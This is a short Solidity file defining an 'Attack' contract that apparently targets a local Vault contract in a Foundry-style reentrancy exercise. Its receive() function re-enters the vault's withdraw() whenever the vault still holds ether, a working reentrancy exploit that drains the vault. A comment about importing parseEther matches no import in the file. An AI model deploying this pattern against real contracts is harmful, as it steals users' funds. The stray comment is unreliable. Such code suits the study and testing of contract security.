// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Vault.sol";
import {console} from "forge-std/console.sol";
// The import is not correct. `parseEther` is not exported from "forge-std/Test.sol".
// If you want to use `parseEther`, import it from "forge-std/StdCheats.sol":

contract Attack {
    function deposit(address payable vault) public payable {
        // Vault(vault).deposite{value: msg.value}();
        vault.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
    }

    function callWithdraw(address payable vault) public {
        Vault(vault).withdraw();
    }

    receive() external payable {
        // get the balance of the vault
        uint256 value = address(msg.sender).balance;
        console.log("value of vault is", value);
        if (value > 0) {
            // To call withdraw() on the Vault contract (which is msg.sender here), encode the function signature:
            (bool result,) = msg.sender.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
